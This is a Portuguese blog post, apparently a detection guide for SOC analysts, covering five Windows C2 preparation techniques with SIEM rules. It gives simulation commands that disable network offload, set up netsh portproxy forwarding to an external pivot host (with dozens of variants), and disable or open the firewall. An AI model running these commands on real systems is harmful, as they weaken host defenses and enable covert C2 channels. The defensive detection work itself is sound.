@@ -1,0 +1,4435 @@
+---
+title: "Detectando técnicas de C2: Guia prático para Analistas de SOC"
+url: "/blog/detectando-tecnicas-de-c2"
+date: 2026-01-08T16:07:00-03:00
+draft: false
+description: "Um guia prático para identificar técnicas de C2, com simulações reais."
+noindex: false
+featured: false
+pinned: false
+comments: false
+series:
+ - 
+categories:
+ - Windows
+ - Segurança e Defesa
+ - Ataques e Exploração
+ - Resposta a Incidentes
+ - Threat Detection
+ - Threat Hunting
+tags:
+ - Resposta a Incidentes
+ - Análise de Logs
+ - Registros
+ - Threat Hunting
+ - Detecção de Ameaças
+ - Exploração
+ - Logs do Windows
+ - Scripts
+ - PowerShell
+ - CyberSecurity
+ - Threat Detection
+ - C2Detection
+ - SIEM
+ - SOAR
+authors:
+ - sandson
+#images:
+---
+{{< bs/alert danger >}}
+{{< bs/alert-heading "Atenção!" >}}
+O presente artigo tem finalidade exclusivamente educacional.<br>As técnicas, ferramentas e conceitos aqui apresentados têm o objetivo de promover o conhecimento, fortalecer a segurança da informação e educar profissionais e entusiastas da área.<br>Não incentivo nem apoio qualquer atividade ilegal.<br>O uso indevido das informações aqui descritas é de inteira responsabilidade do leitor.<br>Recomenda-se que todos os testes sejam realizados em ambientes controlados e com a devida autorização.
+{{< /bs/alert >}}
+
+{{< bs/alert warning >}}
+{{< bs/alert-heading "Recomendação!" >}}
+Eu recomendo a leitura com o tema claro, devido a quantidade de tópicos e subtópicos muito próximos um do outro.
+{{< /bs/alert >}}
+
+# TL;DR
+
+Este guia apresenta **10 técnicas de Command & Control (C2)** utilizadas por atacantes, incluindo métodos com `netsh` (ainda amplamente usado), Sliver C2, pivoting com domínios, DNS tunneling e WireGuard.
+
+Cada técnica inclui:
+- Simulação prática em ambiente controlado
+- Regras SIEM prontas para implementação imediata
+- Indicadores de comprometimento (IoCs) específicos
+- Correlações inteligentes para reduzir falsos positivos
+
+Você aprenderá a detectar desde técnicas legadas (netsh port forwarding) até métodos evasivos modernos (DNS C2, in-memory execution, WireGuard tunneling).
+
+O framework completo de simulação permite validar suas detecções antes de colocá-las em produção.
+
+# Introdução
+
+É fato que constantemente atacantes evoluem suas técnicas de C2 para se evadir de detecções baseadas em assinaturas.
+
+No entanto, muitas dessas detecções nascem da observação de ações preparatórias e auxiliares, que por si só não representam comunicação de C2, mas costumam antecedê-la ou viabilizá-la.
+
+Quando transformadas em regras estáticas, essas observações se tornam frágeis e facilmente burláveis.
+
+Isso ocorre porque atacantes combinam múltiplas técnicas para reduzir visibilidade e se misturar ao comportamento legítimo do sistema, incluindo:
+
+- **Ofuscação de comandos:** PowerShell encriptado, Base64, variáveis
+- **Living off the Land (LOLBins):** Ferramentas nativas do Windows (`netsh`, `wmic`, `reg`)
+- **Protocolos legítimos:** HTTPS, DNS, WireGuard ocultam tráfego malicioso
+- **Execução in-memory:** BOFs/COFFs evitam gravação em disco
+- **Pivoting nativo:** Frameworks como Sliver eliminam dependência de ferramentas legadas
+
+O resultado? **Blind spots** na detecção.
+
+Este guia foca em **correlações contextuais** e **análise comportamental** para identificar atividades maliciosas ao longo da cadeia de ataque, independentemente da ferramenta, comando ou framework utilizado.
+
+# Técnica 1: Netsh IPv4/IPv6 task offloading disabled - Comando via `cmd`
+
+<kbd>**MITRE ATT&CK:** T1562.004 (Impair Defenses: Disable or Modify System Firewall)</kbd>
+
+## O que essa técnica faz na prática?
+
+Essa técnica **prepara o ambiente** para uma comunicação estável, previsível e menos visível entre o implante e o operador, atuando em três frentes principais:
+
+### Padronização do comportamento de rede
+
+Ao desabilitar offloads (`taskoffload`, `chimney`), o atacante força o processamento de pacotes para o **usermode e kernel padrão**, evitando variações causadas por aceleração de hardware, drivers ou NICs específicas.
+
+Isso reduz:
+
+* comportamento inconsistente de tráfego
+* falhas em túneis ou canais encapsulados
+* diferenças entre ambientes físicos e virtuais
+
+### Redução de interferência de soluções de segurança
+
+Mecanismos de inspeção baseados em driver, NDIS ou offloading podem:
+
+* quebrar encapsulamentos
+* interferir em túneis VPN
+* alterar timing e fingerprint de tráfego
+
+Ao desativar essas otimizações, o atacante ganha **mais controle sobre o fluxo real de pacotes**, facilitando tunelamento e comunicação disfarçada.
+
+### Preparação para execução de implantes em usermode
+
+A execução de binários com `/usermode` indica a intenção de:
+
+* evitar privilégios elevados
+* reduzir eventos ruidosos de segurança
+* operar dentro do contexto do usuário comprometido
+
+Isso é ideal para C2 modernos que:
+
+* utilizam HTTPS, WebSocket ou túneis VPN
+* não dependem de drivers
+* operam inteiramente em espaço de usuário
+
+OBS.: Nem sempre vemos o uso do comando `/usermode`, salvo em ataques onde o usuário tenta implementar um binário que inicia por _default_ em modo elevado, daí se usa o `/usermode` para ser executado somente naquele usuário sem elevar privilégios.
+
+## Para que isso serve em um ataque?
+
+Essa técnica **não é exploração** e **não é C2 direto**. Ela serve para:
+
+* Estabilizar o canal de comunicação antes do beacon
+* Aumentar confiabilidade do C2
+* Reduzir falhas operacionais do implante
+* Diminuir ruído de detecção associado a drivers ou kernelmode
+* Preparar o host para tunelamento persistente
+
+Em outras palavras é uma **fase de preparação do terreno**, garantindo que, quando o C2 entrar em operação, ele funcione de forma previsível e silenciosa.
+
+## Por que isso pode passar despercebido?
+
+* `netsh` é ferramenta administrativa legítima
+* Alterações de stack de rede são raras, mas não imediatamente maliciosas
+* Cada ação isolada parece “normal”
+* Nem todo ambiente possui regras específicas de `netsh` nesse contexto
+
+O risco está no **encadeamento**.
+
+## O que o atacante faz?
+
+O atacante modifica parâmetros globais do stack de rede do Windows, usando ferramentas administrativas nativas, para estabilizar o ambiente de rede e facilitar comunicações persistentes e controladas.
+
+Um exemplo comum dessa preparação envolve comandos como:
+
+```powershell
+netsh int ipv4 set global taskoffload=disabled
+netsh int ipv6 set global taskoffload=disabled
+```
+
+Esses comandos não criam um canal de C2 nem realizam comunicação externa. Eles modificam o comportamento do sistema, preparando o ambiente para etapas posteriores do ataque. Em **Relatórios de Incidentes** que eu já li, logo após esses comandos é comum iniciar a instalação de um serviço de VPN como o uso do **SoftEther**.
+
+Esse comando é muito comum em ataques, contudo, podem existir variações desse comando, como mostro abaixo:
+
+```powershell
+# Existem pelo menos 9 variações desse comando
+netsh interface ipv4 set global taskoffload=disabled
+netsh i ipv4 set global taskoffload=disabled
+netsh int ipv4 set global taskoffload=disabled
+netsh interface ip set global taskoffload=disabled
+netsh int ip set global taskoffload=disabled
+netsh i ip set global taskoffload=disabled
+netsh interface ipv6 set global taskoffload=disabled
+netsh int ipv6 set global taskoffload=disabled
+netsh i ipv6 set global taskoffload=disabled"
+```
+
+## Detecção no SIEM
+
+A query abaixo captura o comportamento e as variações dos comandos.
+
+<figure style="text-align: center;">
+  <img src="image2.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 1. </strong>Detecção do uso de netsh via Sysmon com Event ID 1 e Windows Security com EventID 4688.</i></figcaption>
+</figure>
+
+## Regra SIEM
+
+```yml
+title: Network Task Offload Disabled via Netsh
+id: e2f28e22-1i6h-8g5j-3f7e-9h8i0j1k2l3g
+status: experimental
+description: Detecta desativação de task offload de rede usando comandos netsh. Pode ser usado para evitar inspeção de tráfego por hardware de rede ou melhorar compatibilidade com ferramentas de ataque.
+references:
+    - https://attack.mitre.org/techniques/T1562/004/
+    - https://sandsoncosta.github.io/blog/detectando-tecnicas-de-c2/
+author: Sandson Costa
+date: 2026/01/12
+tags:
+    - attack.t1562.004
+    - attack.defense_evasion
+    - attack.command_and_control
+    - attack.lateral-movement
+    - attack.execution
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_eventid:
+        - 1
+        - 4688
+    selection_netsh:
+        - Image|endswith: '\netsh.exe'
+        - OriginalFileName: 'netsh.exe'
+    selection_interface:
+        CommandLine|contains:
+            - 'interface'
+            - 'int'
+            - 'i'
+    selection_protocol:
+        CommandLine|contains:
+            - 'ip'
+    selection_set:
+        CommandLine|contains|all:
+            - 'set'
+            - 'global'
+            - 'taskoffload'
+            - 'disabled'
+    condition: selection_eventid and selection_netsh and selection_interface and selection_protocol and selection_set
+falsepositives:
+    - Network troubleshooting
+    - Performance tuning
+level: medium
+```
+
+{{< bs/alert info >}}
+{{< bs/alert-heading "Info!" >}}
+Eu coloquei os offloads <code>taskoffload</code> e <code>chimney</code> porque em versões antigas do Windows, o comando <code>netsh int tcp set global chimney=disabled</code> funciona.
+A partir do Windows 8 / Windows Server 2012, o TCP Chimney Offload foi oficialmente descontinuado pela Microsoft e substituído por melhorias no próprio TCP/IP stack. Se você executar comandos semelhantes ao <code>netsh</code> via cmlets powershell (mostro mais a frente), você verá que ele “existe” no PowerShell por legado de API, mas não existe mais operacionalmente nas versões modernas do Windows. O PowerShell usa <code>WMI / CIM (MSFT_NetOffloadGlobalSetting)</code>. Essa classe mantém campos legados por compatibilidade. O enum continua definido, mas não tem efeito prático.
+{{< /bs/alert >}}
+
+# Técnica 2: Disable Task Offloading
+
+<kbd>**MITRE ATT&CK:** T1562.004 (Impair Defenses: Disable or Modify System Firewall)</kbd>
+<br>
+<kbd>**MITRE ATT&CK:** T1059.001 (Command and Scripting Interpreter: PowerShell)</kbd>
+
+É o equivalente à **Técnica 1: Netsh IPv4/IPv6 task offloading disabled**, porém, via PowerShell.
+
+```powershell
+Set-NetOffloadGlobalSetting -TaskOffload Disabled
+Disable-NetAdapterChecksumOffload -Name "*"
+```
+
+## Detecção no SIEM
+
+<figure style="text-align: center;">
+  <img src="image6.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 2. </strong>Detecção via PowerShell com Event ID 4104.</i></figcaption>
+</figure>
+
+## Regra SIEM
+
+```yml
+title: Network Adapter Checksum Offload Disabled via PowerShell
+id: f3g39f33-2j7i-9h6k-4g8f-0i9j1k2l3m4h
+status: experimental
+description: Detecta desativação de checksum offload em adaptadores de rede via PowerShell. Usado para evasão de detecção em nível de hardware.
+references:
+    - https://attack.mitre.org/techniques/T1562/004/
+author: Sandson Costa
+date: 2025/01/16
+tags:
+    - attack.defense_evasion
+    - attack.t1562.004
+logsource:
+    product: windows
+    service: powershell
+    definition: 'Requirements: Script Block Logging must be enabled'
+detection:
+    selection_cmdlet1:
+        EventID: 4104
+        ScriptBlockText|contains: 'Disable-NetAdapterChecksumOffload'
+    selection_cmdlet2:
+        EventID: 4104
+        ScriptBlockText|contains|all:
+            - 'Set-NetOffloadGlobalSetting'
+            - 'TaskOffload'
+            - 'Disabled'
+    condition: selection_cmdlet1 or selection_cmdlet2
+falsepositives:
+    - Network optimization scripts
+    - Legitimate performance tuning
+level: medium
+```
+
+{{< bs/alert info >}}
+{{< bs/alert-heading "Info!" >}}
+Cmdlets modernos do PowerShell, como <code>Set-NetOffloadGlobalSetting</code>, não possuem aliases curtos por decisão de design da Microsoft.<br>Diferente de cmdlets interativos (<code>Invoke-WebRequest</code>, <code>Get-ChildItem</code>), módulos administrativos baseados em CIM/WMI priorizam legibilidade, auditoria e consistência em ambientes corporativos.<br>Mesmo que aliases ou funções sejam criados pelo usuário, o PowerShell sempre registra o nome real do cmdlet executado nos logs (Event ID 4104), pois o engine expande o comando antes da execução. Esse comportamento impede a ofuscação de ações administrativas críticas por meio de aliases, sendo possível evitar o nome do cmdlet apenas através de chamadas diretas ao CIM ou manipulação de baixo nível.<br>
+Portanto, para regras de Windows PowerShell, capturar os cmdlets adminsitrativos como os desse exemplo é mais que suficiente para criar uma regra de detecção.<br>
+Mesmo que o atacante crie Alias para substituir o comando original, ainda assim pode ser capturado, pois o PowerShell expande o AST (Abstract Syntax Tree) e a engine loga o Command Invocation real.<br>
+Para entender melhor sobre isso, recomendo ler o artigo abaixo.
+{{< /bs/alert >}}
+
+###### **Leia também!**
+
+{{< bs/bookmark-card
+url="https://sandsoncosta.github.io/blog/an%C3%A1lise-minuciosa-de-ofusca%C3%A7%C3%A3o-powershell-de-um-script-ca%C3%B3tico-ao-start-process-calc.exe/"
+title="Análise minuciosa de ofuscação PowerShell: De um script caótico ao 'Start-Process calc.exe'" 
+img="leiame.png" 
+author="Sandson Costa"
+authorImg="sandson.jpg"
+authorIcon="pencil-square"
+authorIconVendor="bootstrap"
+>}}
+Análise prática de um script PowerShell ofuscado, revelando passo a passo da sua lógica até executar calc.exe com Start-Process. Ideal para estudos de Threat Hunting.
+{{< /bs/bookmark-card >}}
+
+# Técnica 3: Netsh Port Forwarding
+
+<kbd>**MITRE ATT&CK:** T1090.001 (Proxy: Internal Proxy)</kbd>
+
+## O que é?
+
+`Netsh` permite criar _port forwarding_ no Windows, redirecionando tráfego de uma porta local para servidor remoto. Apesar de existirem técnicas mais modernas, **netsh continua sendo usado** por sua simplicidade e disponibilidade nativa.
+
+## Como funciona?
+
+```mermaid
+graph BR
+    V[Vítima/Implant<br/>Rede Interna]
+    PP["netsh portproxy<br/>0.0.0.0:8080 → pivot.sandsoncosta.com:443"]
+    P[Windows Pivot<br/>Máquina Comprometida]
+    C2[Servidor C2<br/>pivot.sandsoncosta.com]
+    
+    V -->|"TCP:8080<br/>(Conexão Local)"| PP
+    PP -.->|"Redirecionamento"| P
+    P -->|"HTTPS:443<br/>(mTLS)"| C2
+    
+    style V fill:#95e1d3,stroke:#0ca678,color:#000
+    style PP fill:#ffd93d,stroke:#f08c00,color:#000
+    style P fill:#4ecdc4,stroke:#087f5b,color:#fff
+    style C2 fill:#ff6b6b,stroke:#c92a2a,color:#fff
+```
+
+O atacante cria uma regra de `portproxy` no host comprometido, permitindo que outras máquinas da rede acessem o C2 através dele.
+
+## Por que ainda é usado?
+
+- Nativo do Windows (não requer instalação)
+- Funciona em ambientes legados (Windows 7+)
+- Bypass de firewall interno
+- Baixa complexidade de implementação
+- Difícil rastrear sem logs adequados
+
+## Como simular?
+
+```powershell
+# Criar port forwarding
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+
+# Verificar regra criada
+#netsh interface portproxy show all
+
+# Permitir no firewall
+# New-NetFirewallRule -DisplayName "Windows Update" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
+```
+Esse comando também várias variações. Entender e saber as variações de comandos, podem evitar `blind spots` em regras.
+
+Veja abaixo **52 variações** desse comando:
+
+```powershell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh i portproxy add v4tov4 listenport=8081 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh int portproxy add v4tov4 listenport=8082 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface p add v4tov4 listenport=8083 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface po add v4tov4 listenport=8084 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface port add v4tov4 listenport=8085 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy a v4tov4 listenport=8086 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy ad v4tov4 listenport=8087 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh i p a v4tov4 listenport=8088 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh int po ad v4tov4 listenport=8089 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh i port a v4tov4 listenport=8090 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v listenport=8091 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov6 listenport=8092 listenaddress=0.0.0.0 connectport=443 connectaddress=2001:db8::1
+netsh interface portproxy add v6tov4 listenport=8093 listenaddress=:: connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v6tov6 listenport=8094 listenaddress=:: connectport=443 connectaddress=2001:db8::1
+netsh interface portproxy add v4tov4 l=8095 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 listenport=8096 listena=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 listenport=8097 listenaddress=0.0.0.0 connectp=443 connectaddress=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 listenport=8098 listenaddress=0.0.0.0 connectport=443 c=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 l=8099 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v4tov4 l=8100 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i po ad v4tov4 l=8101 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh int p a v4tov4 l=8102 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh int po ad v4tov4 l=8103 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh int port a v4tov4 l=8104 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i port ad v4tov4 l=8105 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i po a v l=8106 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh int po ad v l=8107 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 connectport=443 connectaddress=pivot.sandsoncosta.com listenport=8108 listenaddress=0.0.0.0
+netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8109 connectaddress=pivot.sandsoncosta.com connectport=443
+netsh interface portproxy add v4tov4 connectaddress=pivot.sandsoncosta.com listenport=8110 listenaddress=0.0.0.0 connectport=443
+netsh interface portproxy add v4tov4 connectp=443 c=pivot.sandsoncosta.com l=8111 listena=0.0.0.0
+netsh interface portproxy add v4tov4 listena=0.0.0.0 l=8112 c=pivot.sandsoncosta.com connectp=443
+netsh interface portproxy add v4tov4 c=pivot.sandsoncosta.com l=8113 listena=0.0.0.0 connectp=443
+netsh i p a v l=8114 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v connectp=443 c=pivot.sandsoncosta.com l=8115 listena=0.0.0.0
+netsh i po ad v l=8116 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v4tov6 l=8117 listena=0.0.0.0 connectp=443 c=2001:db8::1
+netsh i p a v6tov4 l=8118 listena=:: connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v6tov6 l=8119 listena=:: connectp=443 c=2001:db8::
+netsh int po ad v4tov6 connectp=443 c=2001:db8::1 l=8120 listena=0.0.0.0
+netsh interface portproxy add v4tov4 l=8121 listena=127.0.0.1 connectp=443 c=pivot.sandsoncosta.com
+netsh interface portproxy add v4tov4 l=8122 listena=192.168.1.100 connectp=443 c=pivot.sandsoncosta.com
+netsh int p ad v connectp=443 c=pivot.sandsoncosta.com l=8123 listena=0.0.0.0
+netsh i port a v4tov4 connectaddress=pivot.sandsoncosta.com connectport=443 listenport=8124 listenaddress=0.0.0.0
+netsh interface portproxy add v l=8125 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v4tov4 listenport=8126 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com
+netsh i po a v c=pivot.sandsoncosta.com l=8127 connectp=443 listena=0.0.0.0
+netsh int portproxy a v4tov4 l=8128 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i po ad v l=8129 listena=0.0.0.0 connectp=443 c=pivot.sandsoncosta.com
+netsh i p a v4tov6 l=8130 listena=0.0.0.0 connectp=443 c=2001:db8::1
+netsh i p a v c=pivot.sandsoncosta.com connectp=443 listena=0.0.0.0 l=8131
+```
+
+Em uma situação de **Resposta a Incidentes**, utilizar o comando abaixo vai detecar quais proxys estão configurados no ambiente:
+
+```powershell
+PS C:\Windows\system32> netsh interface portproxy show all
+
+Listen on ipv4:             Connect to ipv4:
+
+Address         Port        Address         Port
+--------------- ----------  --------------- ----------
+0.0.0.0         8080        pivot.sandsoncosta.com 443
+0.0.0.0         8081        pivot.sandsoncosta.com 443
+0.0.0.0         8082        pivot.sandsoncosta.com 443
+```
+
+## Detecção no SIEM
+
+<figure style="text-align: center;">
+  <img src="image.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 3. </strong>Detecção via Sysmon e Windows Security.</i></figcaption>
+</figure>
+
+## Ponto de alerta
+
+Existem outras formas de se executar o `netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=443 connectaddress=pivot.sandsoncosta.com`, utilizando comandos posicionais, como no exemplo do comando `netsh int portproxy add v4tov4 8082 pivot.sandsoncosta.com 443 0.0.0.0`.
+
+O comando ser tão direto assim se dá pelo simples fato do `portproxy` aceitar parâmetros posicionais:
+
+```powershell
+Parameters:
+
+       Tag              Value
+       listenport     - IPv4 port on which to listen.
+       connectaddress - IPv4 address to which to connect.
+       connectport    - IPv4 port to which to connect.
+       listenaddress  - IPv4 address on which to listen.
+       protocol       - Protocol to use.  Currently only TCP is supported.
+```
+
+Se eu tiver contado certo, existem **26 variações** desse comando.
+
+A melhor (ou melhores formas) de se capturar isso é por meio de UBA ou uma regex bruta pra identificar esse comportamento:
+
+```yml
+.*\s(add|ad|a)\s+v\S*\s+\S+\s+\S+\s+\S+\s+\S+.*
+```
+
+<figure style="text-align: center;">
+  <img src="image-1.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 4. </strong>Regex que captura tanto as variações posicionais quanto as variações anteriores.</i></figcaption>
+</figure>
+
+## Regra SIEM
+
+```yml
+title: Windows - Suspicious Port Proxy Configuration via Netsh - BASELINE
+id: a8b84a88-7e2d-4c1f-9b3a-5d4e6f7a8b9c
+status: experimental
+description: Detecta configuração de port proxy via netsh para redirecionamento de tráfego C2. Atacantes usam portproxy para criar túneis e ocultar comunicação com servidores C2.
+references:
+    - https://attack.mitre.org/techniques/T1562/004/
+    - https://attack.mitre.org/techniques/T1090/001/
+    - https://sandsoncosta.github.io/blog/detectando-tecnicas-de-c2/
+author: Sandson Costa
+date: 2025/01/16
+tags:
+    - attack.command_and_control
+    - attack.t1090.001
+    - attack.defense_evasion
+    - attack.t1562.004
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_netsh:
+        - Image|endswith: '\netsh.exe'
+        - OriginalFileName: 'netsh.exe'
+    selection_interface:
+        CommandLine|contains:
+            - 'interface'
+            - ' int '
+            - ' i '
+    selection_portproxy:
+        CommandLine|contains:
+            - 'portproxy'
+            - 'portpr'
+            - 'portp'
+            - 'port'
+            - 'por'
+            - 'po'
+            - 'p'
+    selection_action:
+        CommandLine|contains:
+            - 'add'
+            - 'ad'
+            - 'a'
+    selection_protocol:
+        CommandLine|contains:
+            - 'tov'
+            - 'v'
+    selection_params:
+        CommandLine|contains:
+            - 'listenport'
+            - 'l='
+            - 'connectport'
+            - 'connectp='
+    condition: selection_netsh and selection_interface and selection_portproxy and selection_action and selection_protocol and selection_params
+falsepositives:
+    - Legitimate network administration
+    - VPN configurations
+level: high
+```
+
+{{< bs/alert info >}}
+{{< bs/alert-heading "Info!" >}}
+Para essa técnica não existe um cmdlet PowerShell nativo que faça exatamente o que <code>netsh portproxy</code> faz de forma simples.
+<br>
+Existem formas de se fazer, como por exemplo:
+<br>
+<ul>
+  <li>
+    Chamar o <code>netsh</code> via PowerShell, o que geraria os eventos EID 4688 e EID 1 de qualquer forma.
+  </li>
+  <li>
+    Usar New-NetFirewallRule + NAT. Requer múltiplos comandos e configuração de NAT completo. Geralmente esse conjunto é usado para VMs... O que em um exercício de Red Team ou ataque real, não é usado, pelo menos eu nunca vi. Mas existe possibilidade pra isso.
+  </li>
+  <li>
+    Usar proxy reverso em PowerShell com script customizado... Um script que cria um TCP Relay. É mais complexo e menos comum, mas pra quem tem tempo...
+  </li>
+</ul>
+Veja o uso do netsh sendo chamado via powershell: 
+<figure style="text-align: center;">
+  <img src="image7.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+</figure>
+{{< /bs/alert >}}
+
+# Técnica 4: Netsh Firewall Advfirewall Manipulation
+
+<kbd>**MITRE ATT&CK:** T1562.004 (Impair Defenses: Disable or Modify System Firewall)</kbd>
+
+## O que é?
+
+Uso do `netsh advfirewall` para modificar regras de firewall e permitir comunicação C2, método ainda prevalente em ataques por ser nativo e poderoso, permitir programa em conexão ou simplesmente desabilitar tudo.
+
+## Como funciona?
+
+```mermaid
+flowchart TD
+    A[Atacante com Acesso ao Host] --> B[netsh advfirewall]
+
+    B --> C[Técnica 1: Programa Legítimo]
+    C --> C1["add rule name='Windows Update'<br/>program='C:\Windows\System32\svchost.exe'<br/>action=allow dir=out"]
+    C1 --> C2[C2 se mascara como processo legítimo<br/>Bypass furtivo]
+
+    B --> D[Técnica 2: Desabilitar Firewall]
+    D --> D1["set allprofiles state off"]
+    D1 --> D2[Host totalmente exposto<br/>Todas as portas abertas<br/>Alto risco de detecção]
+
+    B --> E[Técnica 3: Porta Específica]
+    E --> E1["add rule name='Custom Port'<br/>protocol=TCP localport=4444<br/>action=allow dir=in"]
+    E1 --> E2[Canal C2 específico liberado<br/>Menos suspeito que desabilitar]
+    E2 --> E3[Comunicação C2 ativa na porta 4444]
+
+    style A fill:#845ef7,stroke:#5f3dc4,color:#fff
+    style B fill:#4c6ef5,stroke:#364fc7,color:#fff
+    style C2 fill:#51cf66,stroke:#2f9e44,color:#000
+    style D2 fill:#ff6b6b,stroke:#c92a2a,color:#fff
+    style E2 fill:#51cf66,stroke:#2f9e44,color:#000
+    style E3 fill:#4ecdc4,stroke:#087f5b,color:#fff
+```
+
+## Como simular?
+
+```powershell
+# Criar regra outbound
+netsh advfirewall firewall add rule name="Microsoft Compatibility Telemetry" dir=out action=allow remoteip=192.168.223.137 enable=yes
+
+# Ou desabilitar firewall completamente
+netsh advfirewall set allprofiles state off
+```
+
+## Detecção no SIEM
+
+<figure style="text-align: center;">
+  <img src="image5.png" alt="" style="display: block; margin-left: auto; margin-right: auto; max-width: 100%; height: auto;">
+  <figcaption><i><strong>Figura 5. </strong>Detecção via Sysmon e Windows Security.</i></figcaption>
+</figure>
+
+## Regra SIEM
+
+```yml
+title: Windows - Firewall Rule Manipulation for Remote Communication
+id: b9c95b99-8f3e-5d2g-0c4b-6e5f7g8h9i0d
+status: experimental
+description: Detecta criação de regras de firewall permitindo comunicação com IPs específicos, incluindo todas as variações de comandos netsh advfirewall e suas abreviações.
+references:
+    - https://attack.mitre.org/techniques/T1562/004/
+author: Security Team
+date: 2025/01/16
+modified: 2025/01/16
+tags:
+    - attack.defense_evasion
+    - attack.t1562.004
+    - attack.command_and_control
+logsource:
+    product: windows
+    category: process_creation
+detection:
+    selection_netsh:
+        - Image|endswith: '\netsh.exe'
+        - OriginalFileName: 'netsh.exe'
+    selection_advfirewall:
+        CommandLine|contains:
+            - 'advfirewall'
+            - ' adv '
+    selection_firewall:
+        CommandLine|contains:
+            - 'firewall'
+            - ' f '
+    selection_action_add:
+        CommandLine|contains:
+            - ' add '
+            - ' a '
+    selection_rule:
+        CommandLine|contains: 'rule'
+    selection_params:
+        CommandLine|contains:
+            - 'action='
+            - 'remoteip='
+            - 'dir='
+    condition: selection_netsh and selection_advfirewall and (selection_firewall or selection_action_add) and selection_rule and selection_params
+falsepositives:
+    - Legitimate firewall management
+    - Software installations
+level: medium
+```
+
+# Técnica 5: Firewall Manipulation via PowerShell
+
+<kbd>**MITRE ATT&CK:** T1562.004 (Impair Defenses: Disable or Modify System Firewall)</kbd>
+<br>
+<kbd>**MITRE ATT&CK:** T1059.001 (Command and Scripting Interpreter: PowerShell)</kbd>
+
+É o equivalente à **Técnica 4: Netsh Firewall Advfirewall Manipulation**, porém, via PowerShell.
+
+```powershell
+New-NetFirewallRule -DisplayName "Microsoft Compatibility Telemetry" -Direction Outbound -Action Allow -RemoteAddress 192.168.223.137
+
+# Desabilitar firewall
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+
+## Regra SIEM
+
+Conforme comentado na **Técnica 2: Disable Task Offloading**, os comandos administrativos não são alterados por aliases, então ficam fáceis de se capturar por uma regra simples.
+
+```yml
+title: Windows Firewall Disabled via PowerShell Cmdlet
+id: g4h40g44-3k8j-0i7l-5h9g-1j0k2l3m4n5i
+status: experimental
+description: Detecta desativação do Windows Firewall usando cmdlets PowerShell em qualquer perfil (Domain, Public, Private).
+references:
+    - https://attack.mitre.org/techniques/T1562/004/
+author: Security Team
+date: 2025/01/16
+tags:
+    - attack.defense_evasion
+    - attack.t1562.004
+logsource:
+    product: windows
+    service: powershell
+    definition: 'Requirements: Script Block Logging must be enabled'
+detection:
+    selection:
+        EventID: 4104
+        ScriptBlockText|contains|all:
+            - 'Set-NetFirewallProfile'
+            - '-Enabled'
+    selection_false:
+        ScriptBlockText|contains: 'False'
+    selection_profile:
+        ScriptBlockText|contains:
+            - 'Domain'
+            - 'Public'
+            - 'Private'
+    condition: selection and selection_false and selection_profile
+falsepositives:
+    - Legitimate administrative scripts
+    - Troubleshooting activities
+level: high
+```
+# Técnica 6: Native Domain Pivoting
+
+<kbd>**MITRE ATT&CK:** T1562.004 (Impair Defenses: Disable or Modify System Firewall)</kbd>
+<br>
+<kbd>**MITRE ATT&CK:** T1090.001 (Proxy: Internal Proxy)</kbd>
+
+## Visão geral
+
